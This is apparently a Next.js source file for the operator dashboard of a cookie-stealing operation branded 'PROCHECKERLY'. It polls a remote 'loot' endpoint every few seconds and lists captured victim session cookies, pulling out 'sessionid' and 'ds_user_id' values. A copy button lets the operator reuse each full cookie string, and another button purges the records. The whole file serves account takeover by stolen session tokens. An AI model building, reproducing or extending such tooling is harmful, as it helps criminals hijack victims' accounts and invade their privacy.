"use client";
import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";

// The absolute URL to your aaPanel engine
const REMOTE_API = "https://alipaypoint.eu.cc/api/loot";

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);

  const fetchLoot = async () => {
    try {
      const res = await fetch(REMOTE_API);
      if (!res.ok) throw new Error("Connection lost");
      const data = await res.json();
      setLoot(Array.isArray(data) ? [...data].reverse() : []);
    } catch (err) {
      console.error("Link error:", err);
    }
  };

  useEffect(() => {
    fetchLoot();
    const interval = setInterval(fetchLoot, 4000); // 4s heartbeat
    return () => clearInterval(interval);
  }, []);

  // Helper to extract specific cookie values from the trimmed array
  const getCookieValue = (data: string[], key: string) => {
    const found = data.find((s) => s.startsWith(`${key}=`));
    return found ? found.split("=")[1] : null;
  };

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-12">
      {/* Ultra Clean Header */}
      <header className="flex justify-between items-center mb-16 max-w-6xl mx-auto">
        <div>
          <h1 className="text-white text-xl font-bold tracking-tighter">
            PROCHECKERLY{" "}
            <span className="text-zinc-600 font-light">/ Control</span>
          </h1>
          <p className="text-[9px] uppercase tracking-[0.3em] text-zinc-700 mt-1">
            Status: {loot.length > 0 ? "Stream Active" : "Searching..."}
          </p>
        </div>
        <PurgeButton
          onPurge={async () => {
            await fetch(REMOTE_API, { method: "DELETE" });
            setLoot([]);
          }}
        />
      </header>

      {/* Minimalist Data Table */}
      <main className="max-w-6xl mx-auto">
        <div className="rounded-lg border border-zinc-900 bg-zinc-900/10 shadow-sm overflow-hidden">
          <table className="w-full text-left text-xs text-zinc-500">
            <thead className="border-b border-zinc-900 bg-zinc-900/20 text-zinc-600">
              <tr>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  Captured At
                </th>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  UID
                </th>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  Session Token
                </th>
                <th className="px-6 py-4 text-right"></th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/50">
              <AnimatePresence mode="popLayout">
                {loot.map((item, i) => {
                  const sessionId = getCookieValue(item.data, "sessionid");
                  const userId = getCookieValue(item.data, "ds_user_id");

                  return (
                    <motion.tr
                      key={i}
                      layout
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, scale: 0.95 }}
                      className="group hover:bg-white/[0.01] transition-all">
                      <td className="px-6 py-5 text-zinc-700 font-light whitespace-nowrap">
                        {item.timestamp}
                      </td>
                      <td className="px-6 py-5">
                        <span className="text-[10px] text-zinc-300 font-bold tracking-tight">
                          {userId || "ANONYMOUS"}
                        </span>
                      </td>
                      <td className="px-6 py-5">
                        <div className="max-w-md truncate font-light text-zinc-600 group-hover:text-zinc-400 transition-colors">
                          {sessionId
                            ? `sessionid=${sessionId.substring(0, 20)}...`
                            : "PARTIAL_CAPTURE"}
                        </div>
                      </td>
                      <td className="px-6 py-5 text-right">
                        <CopyButton data={item.data.join("; ")} />
                      </td>
                    </motion.tr>
                  );
                })}
              </AnimatePresence>
            </tbody>
          </table>

          {loot.length === 0 && (
            <div className="py-24 text-center text-zinc-800 text-[10px] uppercase tracking-[0.5em] font-light">
              Listening for session streams...
            </div>
          )}
        </div>
      </main>

      {/* Footer System Info */}
      <footer className="mt-8 max-w-6xl mx-auto flex justify-between items-center px-2">
        <div className="flex gap-6 text-[9px] text-zinc-700 uppercase font-bold tracking-widest">
          <span>Active Nodes: 01</span>
          <span>Buffer: Trimmed (JWT Fixed)</span>
        </div>
        <div className="text-[9px] text-zinc-800 font-bold tracking-widest uppercase italic">
          Internal Control Only
        </div>
      </footer>
    </div>
  );
}
